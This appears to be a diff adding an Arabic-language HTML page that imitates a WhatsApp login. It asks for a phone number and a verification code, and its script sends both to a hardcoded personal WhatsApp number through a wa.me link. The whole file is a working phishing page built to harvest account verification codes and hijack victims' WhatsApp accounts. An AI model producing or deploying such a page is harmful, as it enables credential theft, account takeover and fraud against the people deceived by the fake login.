@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى واتساب</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #E5DDD5;
+            padding: 20px;
+            margin: 0;
+        }
+        h1 {
+            text-align: center;
+            color: #25D366;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo img {
+            width: 150px;
+        }
+        label {
+            font-size: 16px;
+            margin-bottom: 5px;
+            display: block;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #25D366;
+            color: white;
+            font-size: 18px;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        button:hover {
+            background-color: #128C7E;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/69/WhatsApp_logo_2023.svg" alt="واتساب">
+        </div>
+        <h1>تسجيل الدخول إلى واتساب</h1>
+        <form id="login-form">
+            <label for="username">رقم الهاتف</label>
+            <input type="text" id="username" name="username" placeholder="أدخل رقم هاتفك" required>
+            <label for="password">رمز التأكيد</label>
+            <input type="password" id="password" name="password" placeholder="أدخل رمز التأكيد" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // منع إعادة تحميل الصفحة
+
+            // جلب البيانات من الحقول
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // صياغة النص اللي هيتبعت على الواتساب
+            const message = "رقم الهاتف: " + username + "\n" + "رمز التأكيد: " + password;
+
+            // رقم الواتساب بتاعك
+            const phoneNumber = "201093429935"; // رقمك مع كود الدولة بدون "+" 
+
+            // تأكد من أن الرابط يعمل بشكل صحيح عبر تشفير الرسالة
+            const whatsappURL = "https://wa.me/" + phoneNumber + "?text=" + encodeURIComponent(message);
+
+            // فتح الرابط في نافذة جديدة
+            window.open(whatsappURL, "_blank");
+        });
+    </script>
+</body>
+</html>
